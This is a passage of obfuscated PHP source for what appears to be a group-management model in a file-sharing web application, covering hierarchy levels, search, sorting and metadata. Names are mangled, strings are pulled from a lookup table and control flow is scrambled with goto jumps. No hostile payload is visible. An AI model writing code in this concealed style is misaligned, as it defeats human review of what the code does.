array($e¬åôšĞ†õ[1747] => $EÔ½…Çš¾İ[$e¬åôšĞ†õ[1747]], $e¬åôšĞ†õ[1748] => $EÔ½…Çš¾İ[$e¬åôšĞ†õ[1748]])); unset($EÔ½…Çš¾İ[$e¬åôšĞ†õ[1747]]); unset($EÔ½…Çš¾İ[$e¬åôšĞ†õ[1748]]); } goto F»²ô¦Îã¶; Cäğ°æÂø: } private function _clearChildrenCache($AÏŠçË°´») { $cö“‘ÒÖ =& $_SERVER[Ïº«‚ßèÔˆø]; $F×Òë¯Ğ„´ = array($cö“‘ÒÖ[552] => array($cö“‘ÒÖ[511], $AÏŠçË°´»[$cö“‘ÒÖ[485]] . $AÏŠçË°´»[$cö“‘ÒÖ[1671]] . $cö“‘ÒÖ[512])); $Cß¯Ó©Ò¬Ü = $this->field($cö“‘ÒÖ[1671])->where($F×Òë¯Ğ„´)->select(); foreach ($Cß¯Ó©Ò¬Ü as $dÆ÷âÈ¨ïˆ) { $this->cacheFunctionClear($cö“‘ÒÖ[1750], $dÆ÷âÈ¨ïˆ[$cö“‘ÒÖ[1671]]); $this->cacheFunctionClear($cö“‘ÒÖ[1744], $dÆ÷âÈ¨ïˆ[$cö“‘ÒÖ[1671]]); } } private function _changeChildLevel($a”Ş…ç¤ÔÒ, $BµäğäƒÉ§, $F”¤¼ö·Ÿ× = false) { goto fˆ»¦ß¢; BÔˆ£“©íİ: $this->_clearChildrenCache($a”Ş…ç¤ÔÒ); $this->where($dÌ¨…ËŸéŸ)->data($F“ƒ« ±¬Ò)->save(); goto fÚÇÖëÛ…İ; fˆ»¦ß¢: $D™£­»¥à =& $_SERVER[Ïº«‚ßèÔˆø]; $A÷»àÀŠ‰í = $a”Ş…ç¤ÔÒ[$D™£­»¥à[485]] . $a”Ş…ç¤ÔÒ[$D™£­»¥à[1671]] . $D™£­»¥à[47]; $cÔÍàÜó¬ = $BµäğäƒÉ§[$D™£­»¥à[485]] . $BµäğäƒÉ§[$D™£­»¥à[1671]] . $D™£­»¥à[47] . $a”Ş…ç¤ÔÒ[$D™£­»¥à[1671]] . $D™£­»¥à[47]; goto b½ÒÀÌå…; b½ÒÀÌå…: if ($F”¤¼ö·Ÿ×) { $cÔÍàÜó¬ = $BµäğäƒÉ§[$D™£­»¥à[485]] . $BµäğäƒÉ§[$D™£­»¥à[1671]] . $D™£­»¥à[47]; } $dÌ¨…ËŸéŸ = array($D™£­»¥à[552] => array($D™£­»¥à[511], $a”Ş…ç¤ÔÒ[$D™£­»¥à[485]] . $a”Ş…ç¤ÔÒ[$D™£­»¥à[1671]] . $D™£­»¥à[512])); $F“ƒ« ±¬Ò = array($D™£­»¥à[552] => array($D™£­»¥à[560], "\162\x65\160\154\x61\143\x65\x28\x70\141\x72\145\156\x74\114\145\166\x65\x6c\x2c\47{$A÷»àÀŠ‰í}\x27\x2c\47{$cÔÍàÜó¬}\47\x29")); goto BÔˆ£“©íİ; fÚÇÖëÛ…İ: } public function setNamePinyin($a”£Ô±ßÎ, $b„Îâ­ºà§ = false) { $dò…‘İº¦Ë =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$b„Îâ­ºà§) { $cÌ‡ğ¥œ£» = $this->getInfoSimple($a”£Ô±ßÎ); $b„Îâ­ºà§ = $cÌ‡ğ¥œ£»[$dò…‘İº¦Ë[28]]; } if (!Input::check($b„Îâ­ºà§, $dò…‘İº¦Ë[555])) { $this->metaSet($a”£Ô±ßÎ, $dò…‘İº¦Ë[442], null); $this->metaSet($a”£Ô±ßÎ, $dò…‘İº¦Ë[441], null); return; } $CŒ¨–Ó¤“‰ = array($dò…‘İº¦Ë[442] => str_replace($dò…‘İº¦Ë[50], $dò…‘İº¦Ë[33], Pinyin::encode($b„Îâ­ºà§)), $dò…‘İº¦Ë[441] => Pinyin::encode($b„Îâ­ºà§, $dò…‘İº¦Ë[556])); $this->metaSet($a”£Ô±ßÎ, $CŒ¨–Ó¤“‰); } protected function groupStatus($b˜‘Ñ’×, $A•àŸ¤´²) { goto fÇ×àğ‚©’; AÁºÆĞù ì: if ($A•àŸ¤´² == $FÛ™£±´ï¾[87]) { $a˜Ã„ğùÂÌ = $this->parentLevelArray($DÖ²Ô®ÓåÕ[$FÛ™£±´ï¾[485]]); } else { $Dğˆ­ŒƒŒÊ = array($FÛ™£±´ï¾[552] => array($FÛ™£±´ï¾[511], $DÖ²Ô®ÓåÕ[$FÛ™£±´ï¾[485]] . $DÖ²Ô®ÓåÕ[$FÛ™£±´ï¾[1671]] . $FÛ™£±´ï¾[512])); $a˜Ã„ğùÂÌ = $this->where($Dğˆ­ŒƒŒÊ)->field($FÛ™£±´ï¾[1671])->select(); $a˜Ã„ğùÂÌ = array_to_keyvalue($a˜Ã„ğùÂÌ, $FÛ™£±´ï¾[33], $FÛ™£±´ï¾[1671]); } $a˜Ã„ğùÂÌ[] = $DÖ²Ô®ÓåÕ[$FÛ™£±´ï¾[1671]]; $Bã’Şõœ‚Ú = array(); goto b¤—Ø°‰‚¯; b¤—Ø°‰‚¯: foreach ($a˜Ã„ğùÂÌ as $b˜‘Ñ’×) { $Bã’Şõœ‚Ú[] = array($FÛ™£±´ï¾[1671] => $b˜‘Ñ’×, $FÛ™£±´ï¾[93] => $FÛ™£±´ï¾[697], $FÛ™£±´ï¾[371] => $A•àŸ¤´²); } return Model($FÛ™£±´ï¾[1751])->addAll($Bã’Şõœ‚Ú, array(), !0); goto Dâ—À¾•‚¦; fÇ×àğ‚©’: $FÛ™£±´ï¾ =& $_SERVER[Ïº«‚ßèÔˆø]; $DÖ²Ô®ÓåÕ = $this->getInfoSimple($b˜‘Ñ’×); if (!$DÖ²Ô®ÓåÕ) { return !1; } goto AÁºÆĞù ì; Dâ—À¾•‚¦: } protected function groupRemove($CŒøĞÄÎõŸ) { goto cØŞËŸîÅ¤; fçÙ¦Œ‹“„: Model($B¸‹‚Ë¾ˆ[782])->groupRootRemove($CŒøĞÄÎõŸ); return $this->where($f¹®ì¸íñ´)->delete(); goto Fê‘¨“Á»µ; FÛ—„¯íé: $this->where(array($B¸‹‚Ë¾ˆ[476] => $CŒøĞÄÎõŸ))->save(array($B¸‹‚Ë¾ˆ[476] => $f„‘¢©Ëê[$B¸‹‚Ë¾ˆ[476]])); Model($B¸‹‚Ë¾ˆ[1751])->where($f¹®ì¸íñ´)->delete(); Model($B¸‹‚Ë¾ˆ[1752])->where($f¹®ì¸íñ´)->delete(); goto fçÙ¦Œ‹“„; cØŞËŸîÅ¤: $B¸‹‚Ë¾ˆ =& $_SERVER[Ïº«‚ßèÔˆø]; $f¹®ì¸íñ´ = array($B¸‹‚Ë¾ˆ[1671] => $CŒøĞÄÎõŸ); $f„‘¢©Ëê = $this->where($f¹®ì¸íñ´)->find(); goto e†×ÎéŒª¯; e†×ÎéŒª¯: if (!$f„‘¢©Ëê || $f„‘¢©Ëê[$B¸‹‚Ë¾ˆ[476]] == 0) { return !1; } $Cã–Ë‰ŸÈ‰ = $this->getInfoSimple($f„‘¢©Ëê[$B¸‹‚Ë¾ˆ[476]]); $this->_changeChildLevel($f„‘¢©Ëê, $Cã–Ë‰ŸÈ‰, !0); goto FÛ—„¯íé; Fê‘¨“Á»µ: } protected function groupSort($F‹ƒ£èùÍñ) { $E¸—•î•³” =& $_SERVER[Ïº«‚ßèÔˆø]; $f—Ò´è£–Š = array(); foreach ($F‹ƒ£èùÍñ as $AÂ”ÃĞÃ³¬ => $fÃÖŒ‘ÙÇè) { $f—Ò´è£–Š[] = array($E¸—•î•³”[1671], $fÃÖŒ‘ÙÇè, $E¸—•î•³”[1694], $AÂ”ÃĞÃ³¬ + 1); } $this->saveAll($f—Ò´è£–Š); } public function listData() { $aî·‡­¨£È = $this->_makeOrder()->selectPage(50); $this->_listDataApply($aî·‡­¨£È[$_SERVER[Ïº«‚ßèÔˆø][366]]); return $aî·‡­¨£È; } private function _makeOrder($C˜õƒÅõ’µ = '') { goto b É˜êèéÊ; b É˜êèéÊ: $a‘ÖÃĞ‹Ïâ =& $_SERVER[Ïº«‚ßèÔˆø]; $bñ¿Ò¸Ä× = array($a‘ÖÃĞ‹Ïâ[1671], $a‘ÖÃĞ‹Ïâ[28], $a‘ÖÃĞ‹Ïâ[1657], $a‘ÖÃĞ‹Ïâ[193]); $AÃ¶¼Ü¢ñ = array($a‘ÖÃĞ‹Ïâ[426] => $a‘ÖÃĞ‹Ïâ[427], $a‘ÖÃĞ‹Ïâ[428] => $a‘ÖÃĞ‹Ïâ[429]); goto cËö†ßùØî; e® ­‚×ÏÍ: $C˜õƒÅõ’µ = $C˜õƒÅõ’µ . "{$Fö”¡¤ºè×}\40{$BÕŒ©¬¨ñÅ}\54\40\147\162\x6f\x75\x70\x49\x44\x20\x61\163\x63"; return $this->order($C˜õƒÅõ’µ); goto fåÆ‰åª£¨; cËö†ßùØî: $Fö”¡¤ºè× = Input::get($a‘ÖÃĞ‹Ïâ[433], $a‘ÖÃĞ‹Ïâ[7], $a‘ÖÃĞ‹Ïâ[1675], $bñ¿Ò¸Ä×); $BÕŒ©¬¨ñÅ = Input::get($a‘ÖÃĞ‹Ïâ[434], $a‘ÖÃĞ‹Ïâ[7], $a‘ÖÃĞ‹Ïâ[1753], array($a‘ÖÃĞ‹Ïâ[1753], $a‘ÖÃĞ‹Ïâ[428])); $BÕŒ©¬¨ñÅ = $AÃ¶¼Ü¢ñ[$BÕŒ©¬¨ñÅ]; goto e® ­‚×ÏÍ; fåÆ‰åª£¨: } public function listChild($CÈª§æ½¡) { $Aƒ‚ÏËšù =& $_SERVER[Ïº«‚ßèÔˆø]; $b–ÈùˆÒĞ = $this->where(array($Aƒ‚ÏËšù[476] => $CÈª§æ½¡))->_makeOrder()->selectPage(200); $this->_listDataApply($b–ÈùˆÒĞ[$Aƒ‚ÏËšù[366]]); return $b–ÈùˆÒĞ; } public function listByID($Cº¾ëÍ¦ƒ–) { $b‡Ä¨´·õ· =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$Cº¾ëÍ¦ƒ–) { return array(); } $fé“Ãèº»Ê = array($b‡Ä¨´·õ·[1671] => array($b‡Ä¨´·õ·[7], $Cº¾ëÍ¦ƒ–)); $d­¬óÉÔ‚Ô = $this->where($fé“Ãèº»Ê)->select(); $this->_listDataApply($d­¬óÉÔ‚Ô); return $d­¬óÉÔ‚Ô; } public function listSearch($a²œİÃÓ–í) { goto bˆ‚Ü”£š; bˆ‚Ü”£š: $Aä¹‚¾± =& $_SERVER[Ïº«‚ßèÔˆø]; $bÊáÎ‚Õßõ = $a²œİÃÓ–í[$Aä¹‚¾±[1754]]; $aÑƒã‰Î÷á = isset($a²œİÃÓ–í[$Aä¹‚¾±[1755]]) ? $a²œİÃÓ–í[$Aä¹‚¾±[1755]] : !1; goto bğö†É†´Ú; E—äÚšßâ´: $eæ”â¾ÆÚ = $eæ”â¾ÆÚ ? $eæ”â¾ÆÚ : array($Aä¹‚¾±[366] => array(), $Aä¹‚¾±[363] => array()); if (!$eæ”â¾ÆÚ || count($eæ”â¾ÆÚ[$Aä¹‚¾±[366]]) < 5 && Input::check($bÊáÎ‚Õßõ, $Aä¹‚¾±[315])) { goto CÆ¼Şƒ¬¨; Cè“”Çò¤: $EÉ¨ºÏ™õÊ = array_merge($f®Ü©„îîÓ, $CÜ«‰æÉ‡À, $eæ”â¾ÆÚ[$Aä¹‚¾±[366]]); $eæ”â¾ÆÚ[$Aä¹‚¾±[366]] = array_unique_by_key($EÉ¨ºÏ™õÊ, $Aä¹‚¾±[1671]); $eæ”â¾ÆÚ[$Aä¹‚¾±[363]][$Aä¹‚¾±[364]] = count($eæ”â¾ÆÚ[$Aä¹‚¾±[366]]); goto DòŒæ–…¼„; CÆ¼Şƒ¬¨: $C¨‰‰õßÒï = $this->groupChildrenAll($aÑƒã‰Î÷á); $f®Ü©„îîÓ = $this->_searchFromMeta($Aä¹‚¾±[441], $bÊáÎ‚Õßõ, 10, $C¨‰‰õßÒï); $CÜ«‰æÉ‡À = $this->_searchFromMeta($Aä¹‚¾±[442], $bÊáÎ‚Õßõ, 10, $C¨‰‰õßÒï); goto Cè“”Çò¤; DòŒæ–…¼„: $eæ”â¾ÆÚ[$Aä¹‚¾±[363]][$Aä¹‚¾±[365]] = ceil($eæ”â¾ÆÚ[$Aä¹‚¾±[363]][$Aä¹‚¾±[364]] / $eæ”â¾ÆÚ[$Aä¹‚¾±[363]][$Aä¹‚¾±[360]]); goto c²¡Øñ„‰Ç; c²¡Øñ„‰Ç: } $this->_listDataApply($eæ”â¾ÆÚ[$Aä¹‚¾±[366]]); goto aíÊ¹²ƒîœ; aíÊ¹²ƒîœ: return $eæ”â¾ÆÚ; goto D¶ÎŒ×íÖæ; D£Ÿ†½‚Õ¥: if ($aÑƒã‰Î÷á) { $CÅÈõÄ»åô = $this->getInfoSimple($aÑƒã‰Î÷á); $bŸÑ°ÓèÑ = $CÅÈõÄ»åô[$Aä¹‚¾±[485]] . $aÑƒã‰Î÷á . $Aä¹‚¾±[512]; $D¸äí‰‹áÌ = array($D¸äí‰‹áÌ, array($Aä¹‚¾±[485] => array($Aä¹‚¾±[379], $bŸÑ°ÓèÑ))); } $D¸äí‰‹áÌ = $this->parseWhereLike($D¸äí‰‹áÌ); $eæ”â¾ÆÚ = $this->_makeOrder()->where($D¸äí‰‹áÌ)->selectPage(20); goto E—äÚšßâ´; bğö†É†´Ú: if (!trim($bÊáÎ‚Õßõ)) { return !1; } $bÊáÎ‚Õßõ = str_replace($Aä¹‚¾±[1756], $Aä¹‚¾±[1757], $bÊáÎ‚Õßõ); $D¸äí‰‹áÌ = array($Aä¹‚¾±[1671] => array($Aä¹‚¾±[379], "{$bÊáÎ‚Õßõ}\45"), $Aä¹‚¾±[28] => array($Aä¹‚¾±[379], "\45{$bÊáÎ‚Õßõ}\45"), $Aä¹‚¾±[941] => $Aä¹‚¾±[1758]); goto D£Ÿ†½‚Õ¥; D¶ÎŒ×íÖæ: } protected function groupChildrenAll($fïá††‡¼¾) { $E°¹ºĞµÈë =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$fïá††‡¼¾) { return !1; } if (is_string($fïá††‡¼¾)) { $fïá††‡¼¾ = array($fïá††‡¼¾); } $dÏˆ¬ŠÙÛ¸ = $fïá††‡¼¾; foreach ($fïá††‡¼¾ as $EÑì›»Òš·) { $D“Íë¤„‰æ = $this->getInfoSimple($EÑì›»Òš·); $AĞõ…ÓõÉÓ = array($E°¹ºĞµÈë[485] => array($E°¹ºĞµÈë[379], $D“Íë¤„‰æ[$E°¹ºĞµÈë[485]] . $EÑì›»Òš· . $E°¹ºĞµÈë[512])); $dê¶ÉÄÅé = $this->field($E°¹ºĞµÈë[1671])->where($AĞõ…ÓõÉÓ)->select(); $dÏˆ¬ŠÙÛ¸ = array_merge($dÏˆ¬ŠÙÛ¸, array_to_keyvalue($dê¶ÉÄÅé, $E°¹ºĞµÈë[33], $E°¹ºĞµÈë[1671])); } return array_unique($dÏˆ¬ŠÙÛ¸); } private function _searchFromMeta($eõ†ŸÑØ¾Ú, $dÌîê‹Æª, $e¾«¡‰Ï‚, $D™æ¾„öÃ) { goto b•ËÜÂŸé; F°Ä¤É…ëó: $BÎ»”Îƒ”’ = $this->parseWhereLike($BÎ»”Îƒ”’); if ($D™æ¾„öÃ) { $BÎ»”Îƒ”’[$f²ÀÛê•ÖÒ[1671]] = array($f²ÀÛê•ÖÒ[7], $D™æ¾„öÃ); } $EÖ³èÔÊòå = Model($f²ÀÛê•ÖÒ[1759])->where($BÎ»”Îƒ”’)->limit($e¾«¡‰Ï‚)->select(); goto fò¥·Š’×Ë; c‰Ã­—‹: if (!$e†ÔÙ™öŞÂ) { return array(); } return $e†ÔÙ™öŞÂ; goto E´Ûô‚½×”; fò¥·Š’×Ë: if (!$EÖ³èÔÊòå) { return array(); } $EÖ³èÔÊòå = array_to_keyvalue($EÖ³èÔÊòå, $f²ÀÛê•ÖÒ[33], $f²ÀÛê•ÖÒ[1671]); $e†ÔÙ™öŞÂ = $this->where(array($f²ÀÛê•ÖÒ[1749] => array($f²ÀÛê•ÖÒ[7], $EÖ³èÔÊòå)))->select(); goto c‰Ã­—‹; b•ËÜÂŸé: $f²ÀÛê•ÖÒ =& $_SERVER[Ïº«‚ßèÔˆø]; $dÌîê‹Æª = strtolower($dÌîê‹Æª); $BÎ»”Îƒ”’ = array($f²ÀÛê•ÖÒ[93] => $eõ†ŸÑØ¾Ú, $f²ÀÛê•ÖÒ[371] => array($f²ÀÛê•ÖÒ[379], "\45{$dÌîê‹Æª}\45")); goto F°Ä¤É…ëó; E´Ûô‚½×”: } protected function _listDataApplyItem($eŸ‰í×µĞ) { $fê‹µôÍŞÉ = array($eŸ‰í×µĞ); $this->_listDataApply($fê‹µôÍŞÉ); return $fê‹µôÍŞÉ[0]; } protected function _listDataApply(&$aæ‡®ËƒÎ) { goto f°…í¼Ê»Î; Eø­÷ÖË’ê: $this->_listAppendChildren($aæ‡®ËƒÎ); $this->_listAppendChildrenMember($aæ‡®ËƒÎ); $this->_listAppendMeta($aæ‡®ËƒÎ, $A®àô’); goto DÉÂƒ‡™›À; f°…í¼Ê»Î: $a…¿ÖÍï´ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$aæ‡®ËƒÎ) { return; } $A®àô’ = array_to_keyvalue($aæ‡®ËƒÎ, $a…¿ÖÍï´[33], $a…¿ÖÍï´[1671]); goto Eø­÷ÖË’ê; DÉÂƒ‡™›À: $this->_listAppendParent($aæ‡®ËƒÎ); $this->_listAppendSourceRoot($aæ‡®ËƒÎ, $A®àô’); goto E’¸‘ÄïŒ‡; E’¸‘ÄïŒ‡: } private function _listAppendChildren(&$bË†¬Îš¬Ü) { goto cà‹¡Ê…Ÿ°; DïÉ¦‹Ò: foreach ($bË†¬Îš¬Ü as &$DÒ‚ÊÙø×¯) { $DğÌÚ§¨¦ = $DÒ‚ÊÙø×¯[$B›‰Ã³ˆ«[1671]]; $DÒ‚ÊÙø×¯[$B›‰Ã³ˆ«[1761]] = isset($FŒåäÌ¥Ø³[$DğÌÚ§¨¦]) ? intval($FŒåäÌ¥Ø³[$DğÌÚ§¨¦]) : !1; } unset($DÒ‚ÊÙø×¯); goto bÓîšÌ¿Ò; Dé¸¸¬¼µ: $Dâ‡Ûà”™ë = array($B›‰Ã³ˆ«[476], $B›‰Ã³ˆ«[1760] => $B›‰Ã³ˆ«[478]); $EÁÆªƒçŠì = $this->field($Dâ‡Ûà”™ë)->where($EÀ‹ÄÔšªš)->group($B›‰Ã³ˆ«[476])->select(); $FŒåäÌ¥Ø³ = array_to_keyvalue($EÁÆªƒçŠì, $B›‰Ã³ˆ«[476], $B›‰Ã³ˆ«[478]); goto DïÉ¦‹Ò; cà‹¡Ê…Ÿ°: $B›‰Ã³ˆ« =& $_SERVER[Ïº«‚ßèÔˆø]; $c˜Ü‰»‘¬ = array_to_keyvalue($bË†¬Îš¬Ü, $B›‰Ã³ˆ«[33], $B›‰Ã³ˆ«[1671]); $EÀ‹ÄÔšªš = array($B›‰Ã³ˆ«[476] => array($B›‰Ã³ˆ«[7], $c˜Ü‰»‘¬)); goto Dé¸¸¬¼µ; bÓîšÌ¿Ò: } private function _listAppendChildrenMember(&$B–³°º¦ÇÀ) { goto c…Òß¡ïİœ; c…Òß¡ïİœ: $A¯ÔÎÊ¼ªè =& $_SERVER[Ïº«‚ßèÔˆø]; $DÃïôĞ÷ö = array_to_keyvalue($B–³°º¦ÇÀ, $A¯ÔÎÊ¼ªè[33], $A¯ÔÎÊ¼ªè[1671]); $A—ç×´±ˆÁ = array($A¯ÔÎÊ¼ªè[1671] => array($A¯ÔÎÊ¼ªè[7], $DÃïôĞ÷ö)); goto EÂ¸õ³Ñè; EÂ¸õ³Ñè: $Cî¦Á¾º¹Ò = array($A¯ÔÎÊ¼ªè[1671], $A¯ÔÎÊ¼ªè[1760] => $A¯ÔÎÊ¼ªè[478]); $Aˆ¯÷„Œ„¢ = Model($A¯ÔÎÊ¼ªè[1752])->field($Cî¦Á¾º¹Ò)->where($A—ç×´±ˆÁ)->group($A¯ÔÎÊ¼ªè[1671])->select(); $BÑ«¦³‘æ¸ = array_to_keyvalue($Aˆ¯÷„Œ„¢, $A¯ÔÎÊ¼ªè[1671], $A¯ÔÎÊ¼ªè[478]); goto Bâö«¼ÎäË; Bâö«¼ÎäË: foreach ($B–³°º¦ÇÀ as &$F¾„œ•æç) { $BÌ¤‘ˆ²¯ù = $F¾„œ•æç[$A¯ÔÎÊ¼ªè[1671]]; $F¾„œ•æç[$A¯ÔÎÊ¼ªè[1762]] = isset($BÑ«¦³‘æ¸[$BÌ¤‘ˆ²¯ù]) ? intval($BÑ«¦³‘æ¸[$BÌ¤‘ˆ²¯ù]) : !1; } unset($F¾„œ•æç); goto DÎÜƒ‡·Œ; DÎÜƒ‡·Œ: } private function _listAppendMeta(&$Eí ïÃÛì¹, $bİÆµ¸³‡•) { goto CÕòŞà¼ë¾; CÕòŞà¼ë¾: $A®®ø×‘´Ø =& $_SERVER[Ïº«‚ßèÔˆø]; $FÍªÄ™ÉŞå = array($A®®ø×‘´Ø[1671] => array($A®®ø×‘´Ø[7], $bİÆµ¸³‡•)); $cÇ·øÏ»‰É = Model($A®®ø×‘´Ø[1751])->where($FÍªÄ™ÉŞå)->select(); goto a´Â¢¤ôË°; Fø‘àçå¼„: foreach ($Eí ïÃÛì¹ as &$CµŞš·ÃØŸ) { $CµŞš·ÃØŸ[$A®®ø×‘´Ø[443]] = array(); if (isset($cÇ·øÏ»‰É[$CµŞš·ÃØŸ[$A®®ø×‘´Ø[1671]]])) { $CµŞš·ÃØŸ[$A®®ø×‘´Ø[443]] = $cÇ·øÏ»‰É[$CµŞš·ÃØŸ[$A®®ø×‘´Ø[1671]]]; } } unset($CµŞš·ÃØŸ); goto Fáìèí·Ñ§; a´Â¢¤ôË°: $cÇ·øÏ»‰É = array_to_keyvalue_group($cÇ·øÏ»‰É, $A®®ø×‘´Ø[1671]); foreach ($cÇ·øÏ»‰É as &$B—Á—¿öÅ ) { $B—Á—¿öÅ  = array_to_keyvalue($B—Á—¿öÅ , $A®®ø×‘´Ø[93], $A®®ø×‘´Ø[371]); } unset($B—Á—¿öÅ ); goto Fø‘àçå¼„; Fáìèí·Ñ§: } protected function parentLevelArray($D˜ÀÌ˜îø) { $aåŠ¶õÎ”³ =& $_SERVER[Ïº«‚ßèÔˆø]; $D˜ÀÌ˜îø = explode($aåŠ¶õÎ”³[47], trim($D˜ÀÌ˜îø, $aåŠ¶õÎ”³[47])); $D˜ÀÌ˜îø = array_remove_value($D˜ÀÌ˜îø, $aåŠ¶õÎ”³[495]); return $D˜ÀÌ˜îø; } private function _listAppendParent(&$e˜Ú†Û“Ç) { goto f“ë›ìööê; dÛ×‘î§Œö: unset($eÑ½â¸ù¶ª); foreach ($A¥–Óê—ƒö as $AøõŠ¦®Š² => $E¬´­¢Ø) { if ($E¬´­¢Ø) { continue; } $AˆÏó¿Èå = $this->getInfoSimple($AøõŠ¦®Š²); $A¥–Óê—ƒö[$AøõŠ¦®Š²] = $AˆÏó¿Èå[$D²»ğ†Ø–[28]]; } $fÒòÛ¨½Ë² = $GLOBALS[$D²»ğ†Ø–[6]][$D²»ğ†Ø–[88]][$D²»ğ†Ø–[1763]]; goto FÈê¡›ŠÉŠ; FÈê¡›ŠÉŠ: if ($GLOBALS[$D²»ğ†Ø–[483]] == $D²»ğ†Ø–[87]) { $fÒòÛ¨½Ë² = !1; } foreach ($e˜Ú†Û“Ç as &$eÑ½â¸ù¶ª) { $f£„íœŠ¹ = $this->parentLevelArray($eÑ½â¸ù¶ª[$D²»ğ†Ø–[485]]); $Cˆ·ğŒÊÕ = $D²»ğ†Ø–[33]; foreach ($f£„íœŠ¹ as $AøõŠ¦®Š² => $B¦äàÅ¨Ö) { if ($fÒòÛ¨½Ë² && $AøõŠ¦®Š² == 0) { continue; } $Cˆ·ğŒÊÕ .= $A¥–Óê—ƒö[$B¦äàÅ¨Ö] . $D²»ğ†Ø–[8]; } if ($f£„íœŠ¹) { $Cˆ·ğŒÊÕ .= $eÑ½â¸ù¶ª[$D²»ğ†Ø–[28]]; } $eÑ½â¸ù¶ª[$D²»ğ†Ø–[489]] = str_replace($D²»ğ†Ø–[494], $D²»ğ†Ø–[8], $Cˆ·ğŒÊÕ); } unset($eÑ½â¸ù¶ª); goto bÒåæçÇ‰³; f“ë›ìööê: $D²»ğ†Ø– =& $_SERVER[Ïº«‚ßèÔˆø]; $A¥–Óê—ƒö = array(); foreach ($e˜Ú†Û“Ç as &$eÑ½â¸ù¶ª) { $A¥–Óê—ƒö[$eÑ½â¸ù¶ª[$D²»ğ†Ø–[1671]]] = $eÑ½â¸ù¶ª[$D²»ğ†Ø–[28]]; $f£„íœŠ¹ = $this->parentLevelArray($eÑ½â¸ù¶ª[$D²»ğ†Ø–[485]]); foreach ($f£„íœŠ¹ as $B¦äàÅ¨Ö) { if (!isset($A¥–Óê—ƒö[$B¦äàÅ¨Ö])) { $A¥–Óê—ƒö[$B¦äàÅ¨Ö] = 0; } } } goto dÛ×‘î§Œö; bÒåæçÇ‰³: } private function _listAppendSourceRoot(&$fÃŠØéì„, $bôé¸í‰ì) { goto eÙòñÖóĞ; eÕ˜ù´èÚŒ: foreach ($fÃŠØéì„ as &$Bëµ¹À­¡ç) { $Bëµ¹À­¡ç[$fíÀ ¼æ¼[85]] = $aî™Å¬½­š[$Bëµ¹À­¡ç[$fíÀ ¼æ¼[1671]]] ? $aî™Å¬½­š[$Bëµ¹À­¡ç[$fíÀ ¼æ¼[1671]]] : array(); } unset($Bëµ¹À­¡ç); goto BõƒÊ¼ÒÚÖ; cëæ•ÃŞ©É: $aî™Å¬½­š = Model($fíÀ ¼æ¼[782])->order($fíÀ ¼æ¼[1765])->field($bƒ¡ğĞìí)->where($AÀŞäÊğ)->select(); $aî™Å¬½­š = array_to_keyvalue($aî™Å¬½­š, $fíÀ ¼æ¼[482]); $aî™Å¬½­š = array_remove_key($aî™Å¬½­š, $fíÀ ¼æ¼[482]); goto eÕ˜ù´èÚŒ; eÙòñÖóĞ: $fíÀ ¼æ¼ =& $_SERVER[Ïº«‚ßèÔˆø]; $AÀŞäÊğ = array($fíÀ ¼æ¼[402] => SourceModel::TYPE_GROUP, $fíÀ ¼æ¼[476] => 0, $fíÀ ¼æ¼[482] => array($fíÀ ¼æ¼[7], $bôé¸í‰ì)); $bƒ¡ğĞìí = $fíÀ ¼æ¼[1764]; goto cëæ•ÃŞ©É; BõƒÊ¼ÒÚÖ: } protected function groupMerge($cœÒè›ô˜Œ) { $cœÒè›ô˜Œ = array_values(array_unique($cœÒè›ô˜Œ)); $FàÜå™Úø = array(); for ($fêÌ¢§‘†¢ = 0; $fêÌ¢§‘†¢ < count($cœÒè›ô˜Œ); $fêÌ¢§‘†¢++) { $dÁ›—ùõÑ© = !1; for ($dÃ’³©œ•œ = 0; $dÃ’³©œ•œ < count($cœÒè›ô˜Œ); $dÃ’³©œ•œ++) { if ($fêÌ¢§‘†¢ == $dÃ’³©œ•œ) { continue; } if ($this->isParentOf($cœÒè›ô˜Œ[$dÃ’³©œ•œ], $cœÒè›ô˜Œ[$fêÌ¢§‘†¢])) { $dÁ›—ùõÑ© = !0; break; } } if (!$dÁ›—ùõÑ©) { $FàÜå™Úø[] = $cœÒè›ô˜Œ[$fêÌ¢§‘†¢]; } } return $FàÜå™Úø; } protected function isParentOf($D¤©ïÂæ·­, $eš¿šá»ˆ¾) { goto fµ«²òÚÜµ; d‹œÌÔÊÖì: $a‡£¾¶º„° = $this->getInfoSimple($eš¿šá»ˆ¾); $C“º­– = $FŞÙÑîèˆ[$cŞËÙôæÆ[485]] . $D¤©ïÂæ·­ . $cŞËÙôæÆ[47]; if (substr($a‡£¾¶º„°[$cŞËÙôæÆ[485]], 0, strlen($C“º­–)) == $C“º­–) { return !0; } goto fÂ—ÆÖ¼; fµ«²òÚÜµ: $cŞËÙôæÆ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$D¤©ïÂæ·­ || !$eš¿šá»ˆ¾ || $D¤©ïÂæ·­ == $eš¿šá»ˆ¾) { return !1; } $FŞÙÑîèˆ = $this->getInfoSimple($D¤©ïÂæ·­); goto d‹œÌÔÊÖì; fÂ—ÆÖ¼: return !1; goto DÕÁ‡òò„ª; DÕÁ‡òò„ª: } public function groupShowRoot($cƒàà’‚, $aÏ¬õ›‘®® = false) { goto dÂ¢œ›ñó’; eŠ÷Ôß‡‹: return $A·šÇ¡µÓŠ; goto E­¢¸Î¦Ó; e¾‘¼ŒŸ¬©: $dƒ†µ×İ = $this->parentLevelArray($F˜¢ÛŒïğ[$f©…æÂµøÑ[485]]); $A·šÇ¡µÓŠ = array($cƒàà’‚); if (count($dƒ†µ×İ) == 0) { return $A·šÇ¡µÓŠ; } goto dñÎçïò¸; dÂ¢œ›ñó’: $f©…æÂµøÑ =& $_SERVER[Ïº«‚ßèÔˆø]; $F˜¢ÛŒïğ = $this->getInfo($cƒàà’‚); if (!$F˜¢ÛŒïğ) { return array(); } goto e¾‘¼ŒŸ¬©; dñÎçïò¸: if ($aÏ¬õ›‘®® && count($dƒ†µ×İ) == 1) { return $A·šÇ¡µÓŠ; } if (!$F˜¢ÛŒïğ[$f©…æÂµøÑ[443]] || !isset($F˜¢ÛŒïğ[$f©…æÂµøÑ[443]][$f©…æÂµøÑ[1747]]) || $F˜¢ÛŒïğ[$f©…æÂµøÑ[443]][$f©…æÂµøÑ[1747]] == $f©…æÂµøÑ[1721]) { return $this->groupShowRoot($dƒ†µ×İ[count($dƒ†µ×İ) - 1], $aÏ¬õ›‘®®); } if 